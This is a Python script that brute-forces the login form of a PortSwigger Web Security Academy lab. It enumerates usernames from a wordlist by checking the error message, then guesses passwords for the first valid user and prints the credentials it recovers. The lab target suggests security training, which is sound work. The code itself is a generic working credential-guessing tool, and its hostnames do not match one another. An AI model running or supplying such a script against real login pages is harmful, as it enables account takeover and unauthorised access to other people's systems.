import requests, re

url = "https://0acf97c10c30024.web-security-academy.net/login"

headers = {
    "Host": "0acf00c30024.web-security-academy.net",
   
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "https://0ac00c30024.web-security-academy.net",
    "Referer": "https://0acfc100c30024.web-security-academy.net/login",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "Priority": "u=0, i",
    "Te": "trailers",
    "Connection": "keep-alive"
}

cookies = {
    "session": "332ZZb5W5zDMOuqPr"
}

# Load usernames
with open('/PortSwigger/username.txt', 'r') as f:
    usernames = [line.strip() for line in f if line.strip()]

# Load passwords
with open('/PortSwigger/password.txt', 'r') as f:
    passwords = [line.strip() for line in f if line.strip()]

# Start bruteforce
valid_user=[]
valid_passwd=[]

def user_enum():
    print('='*10+ 'Testing on Username'+ '='*10)

    for username in usernames:
        data={
            'username':username,
            'password':'pass123'
        }

        resp=requests.post(url=url,data=data,cookies=cookies,headers=headers)
        if 'Invalid username or password.' in resp.text:
            print(f'[-] Invalid Username:  {username}')
        else:
            print(f'\n Valid Username: {username}\n\t')
            valid_user.append(username)
            break

def pass_enum():
    print('='*10+ 'Testing on Password'+ '='*10)
    for passwd in passwords:
        data={
            'username':valid_user[0],
            'password': passwd
        }

        resp= requests.post(url=url,data=data,cookies=cookies,headers=headers)

        if 'Invalid username or password' in resp.text:
            print (f'[-] Invalid password: {passwd} ')
        else:
            print(f'Valid Password: {passwd}')
            valid_passwd.append(passwd)
            break

user_enum()
pass_enum()

print(f'Credintional Found \nUsername: {valid_user[0]}\nPassword: {valid_passwd[0]}')
